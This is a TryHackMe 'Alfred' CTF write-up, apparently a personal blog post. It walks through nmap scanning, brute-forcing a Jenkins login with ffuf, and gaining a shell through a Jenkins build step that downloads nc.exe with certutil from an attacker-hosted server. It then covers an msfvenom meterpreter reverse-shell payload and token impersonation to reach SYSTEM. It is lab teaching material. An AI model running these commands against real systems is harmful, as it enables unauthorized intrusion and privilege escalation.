---
layout:   post
title:   THM Alfred CTF Writeup
description:   Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
date:   2021-12-28 11:40:00 +0300
image:  '/assets/img/posts/tryhackme-alfred-ctf-writeup/alfredbanner.png'
tags:   [TryHackme Machines,ctf,pentesting,metasploit,mindows-privesc,windows-tokens,bruteforce,remote-code-execution]
featured:   false
---
# ENUMERATION

Run Network Mapper (**nmap**) on Alfred machine to discover opened ports and services.   

Full command : 
{% highlight bash %}
nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}
{% endhighlight %}

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Output of the scan:
{% highlight bash %}
# Nmap 7.92 scan initiated Tue Dec 28 09:22:17 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN alfred.nmap 10.10.195.99
Nmap scan report for 10.10.195.99
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 28 09:24:13 2021 -- 1 IP address (1 host up) scanned in 115.63 seconds
{% endhighlight %}

Three ports are opened:
## Port 80 http Microsoft IIS httpd 7.5
Ordinary [**Microsoft IIS**](https://en.wikipedia.org/wiki/Internet_Information_Services) web server.
<br>Nothing fancy here.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/2.png)

## Port 3389 tcpwrapped
**tcpwrapped** means that the remote host closed the connection after completing the TCP three-way handshake without receiving any data.
<br>[**More information here**.](https://secwiki.org/w/FAQ_tcpwrapped)
<br>However, port 3389 typically used for [RDP](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) protocol.

## Port 8080 Jetty 9.4.z-SNAPSHOT

There is a [**Jenkins**](https://www.geeksforgeeks.org/what-is-jenkins/) login prompt on port 8080.
<br>![](/assets/img/posts/tryhackme-alfred-ctf-writeup/3.png)<br>
If you google it, you will see the default login credentials for Jenkins is **admin** for the username and **admin** for the password.
However, the system administrator could have changed the password to a different one. In that case default credentials
would be useless. So we will brute force the credentials for best practice.<br>

# EXPLOITATION

In order to create continuous HTTP requests, we have to know how the HTTP request looks.
Launch the [**Burp Suite**](https://www.geeksforgeeks.org/what-is-burp-suite/) to examine the HTTP POST request sent 
when a login attempt occurs.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/4.png)_Request_<br><br>
There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.
1. [**application/x-www-form-urlencoded**](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4) : Encoding type
2. **j_username** : Username field
3. **j_password** : Password Field

I will use [**ffuf**](https://cybersecnerds.com/ffuf-everything-you-need-to-know/) to create POST requests toward the web server.
You can use any fuzzer tool like **THC Hydra**, **Burp Suite** or others. 
<br>Download [**SecLists**](https://github.com/danielmiessler/SecLists) repo with prepeared wordlists included.

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-w                      | Dedicated wordlists                                    |
|-u                      | Target URL                                             |
|-data                   | Data which will be sent with the request               |
|-H                      | HTTP headers that will be sent with the request        |
|-fr                     | Regex which will be filtered out                       |


Full command:
{% highlight bash %}
ffuf -w SecLists/Usernames/top-usernames-shortlist.txt:W1,SecLists/Passwords/Common-Credentials/best1050.txt:W2 -u "http://10.10.56.186:8080/j_acegi_security_check" -data "j_username=W1&j_password=W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "loginError"
{% endhighlight %}

![](/assets/img/posts/tryhackme-alfred-ctf-writeup/6.png)__Cracked the credentials, well done :)__<br><br>
A possible question would be, why filter out "loginError" string ? 
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/5.png)_Left: Request - Right:Response_<br><br>
That sent request got a response with [**HTTP 302 status code**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302), which is the status code for redirection.
It means whenever the application receives invalid credentials from the client; the server redirects the client to the "/loginError" URL.
Based on this, as long as the HTTP response does not include "/loginError" in it, it is safe to say we have sent a valid username-password pair
to the server.
<br><br>
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/7.png)__Login to the Jenkins panel via credentials.__

It is possible to do anything that Jenkins can do since we have an admin portal right now.However, if we could get a shell from the
system, it would be amazing.<br><br>
The way to get a shell from the system is to make Jenkins transmit and execute code in the system shell.<br>
Click on the first project named as **project**, then click **configure**.
Scroll down to the bottom, and you will see a box that executes the windows command written in it.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/9.png)<br>
On the project page, there is a **Build History** section. It is available to check the output of the batch command that had run.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/8.png)
Now, instead of printing the string value of the user who executes it with the **whoami** command, we have to connect to that shell.

<br>I will use [**Netcat**](https://www.ionos.com/digitalguide/server/tools/netcat/) in this manner. It is required to have Netcat downloaded in both the attacker and the
victim machine.
- Download static [**nc.exe**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe) binary for to run it in the victim machine 
- Start a Python3 server in the directory that includes the Netcat static binary file.
<br>Run:
{% highlight shell%}
sudo python3 -m http.server 80
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/10.png)
- Start a Netcat listener in the attacker machine.
<br>Run:
{% highlight shell%}
nc -nvlp {ANY FREE PORT}
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/11.png)
- Download the static binary to the victim machine from the Python web server and run it.
{% highlight powershell%}
certutil.exe -urlcache -split -f http://{THM IP}:80/nc.exe
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/12.png)
- Click **Build** button on the project page.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/13.png)

A get request was made to the web server.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/14.png)
Then we got the shell.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/15.png)__We are in, nice progress ;)__
To get user flag, run:
{% highlight powershell %}
type "C:\Users\Bruce\Desktop\user.txt"
{% endhighlight%}

# WINDOWS TOKENS
This machine focuses on the Windows access tokens and escalate privileges with them.

## What is an access token ?

An access token consists of:
- Privileges
- Group SIDs(security identifier)
- User SIDs
amongst other things.
[**Much more detailed information here.**](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)

An [access token](https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly) contains the security 
information for a logon session. The system creates an access token when a user logs on, and every process 
executed on behalf of the user has a copy of the token. The token identifies the user, the user's groups, 
and the user's privileges. The system uses the token to control access to securable objects and to control 
the ability of the user to perform various system-related operations on the local computer. 
There are two kinds of access token, **primary** and **impersonation**.
<br><br>There are two types access tokens, according to [**Windows Docs**](https://docs.microsoft.com/en-us/):
- [Primary tokens](https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly): An access token that is typically created 
only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.
- [Impersonation tokens](https://docs.microsoft.com/en-us/windows/win32/secgloss/i-gly): An access token that has been created 
to capture the security information of a client process, allowing a server to "impersonate" the client 
process in security operations. It becomes convenient when you are the local admin on a system and want to
impersonate another logged on client, e.g. a domain admin.
<br><br>There are four levels for impersonation token:
    - **SecurityAnonymous**: current user/account/client cannot impersonate another user/account/client.
    - **SecurityIdentification**: current user/account/client can get the privileges and identity of a user, but cannot impersonate the user.
    - **SecurityImpersonation**: current user/account/client can impersonate user's security context on the local system.
    - **SecurityDelegation**: current user/account/client can impersonate user's security context on a remote system.

The security context is a data structure that stores clients' security information.

### Diffrence between proceesses hierarchy in UNIX and Windows
### unix
In UNIX like operating systems, there is the child-parent process hierarchy. Whenever a process
creates a new process, the creating process becomes the parent while created process becomes the child. And the child process
inherits all the permissions from its' parent. If the parent dies, the child becomes an [orphan or zombie process](https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/).

### windows

The parent-child relationship does not exist for the Windows environment. 
However, I will refer to them as parent-child to facilitate the explanation.
Whenever a new process is initiated, the parent process receives an ID and the process handler of the child process.
It simulates the hierarchial relationship if the application requires it to do so. The child process copies the access 
token of its' parent which is created by **LSASS.exe** on logon. However, windows treats all processes as belonging to the 
same generation. 

#### what is the LSASS.exe ?
LSASS.exe, **Local Security Authority Process**, is responsible for authenticating accounts
in the WinLogon service. The process is operated by using authentication packages such as the default msgina.dll. When the user
authenticates, lsass.exe generates a **user access token**, which is then used to launch the initial shell. **Other processes that
the account initiates inherit from this token**.

### commons
Both Windows and UNIX processes inherit the security settings of the creating process by default.
Signals, Exceptions, and Events.


# PRIVILEGE ESCALATION

After gaining the initial access to the target machine, the first step will be to check the account's permissions on the system.

<br>Run: **whoami /priv**
{% highlight powershell %}

C:\Program Files (x86)\Jenkins\workspace\project> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled <--
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled <--
SeCreateGlobalPrivilege         Create global objects                     Enabled <--
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

{% endhighlight %}

Those are the privileges of the current user which are inherited from a group or given to the account when created. 
However, only three of them stated as _Enabled_.
<br><br>[Here](https://github.com/gtworek/Priv2Admin) is the full list of exploitable privileges.
<br>And [here](https://www.exploit-db.com/papers/42556) is the detailed documentation of abusing token privileges.
<br>Also a great video resource [here](https://www.youtube.com/watch?v=QRpfvmMbDMg) about token handling vulnerabilities.

We will need a module called [incognito](https://labs.f-secure.com/archive/incognito-v2-0-released/).
Therefore I will use **Metasploit Framework** while it has the incognito module built-in.

The one I will be exploiting is the **SeImpersonatePrivilege**.
Follow these steps to get [NT AUTHORITY\SYSTEM](https://superuser.com/questions/471769/what-is-the-nt-authority-system-user) privileges.
- Create a meterpreter reverse shell binary.
{% highlight bash %}
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT}-f exe -o ashell.exe
{% endhighlight %}
- Upload the executable to the target machine.
- Start a reverse tcp listener with metasploit:
{% highlight bash %}
msfconsole -q
msf6 use exploit exploit/multi/handler
msf6 set payload windows/meterpreter/reverse_tcp
msf6 set LHOST {THM IM}
msf6 set LPORT {THE PORT DECLARED FOR EXECUTABLE BEFORE}
msf6 run
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png)<br>
- After successfully receiving the meterpreter console, load the incognito module.
<br>Run:
{% highlight bash %}
msf6 load incognito
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/17.png)<br>
Then, list all the available tokens:
{% highlight bash %}
list_tokens -g
{% endhighlight %}
There will be a delegation token called "BULTIN\Administrators". We will impersonate that token.
Delegation and impersonation levels are identical locally.
- Run:
{% highlight bash %}
impersonate_token "BUILTIN\Administrators"
{% endhighlight %}
If everything were successfully done, **NT AUTHORITY\SYSTEM** should be the output of the **getuid** command.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png)
- Run **ps** to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.

![](/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png)<br>
By doing that, we have camouflaged our malicious process into a safer looking one.
<br>![](/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png)<br>
<br>To get the root flag, run:
{% highlight bash %}
cat "C:\Windows\system32\config\root.txt"
{% endhighlight %}
<br>
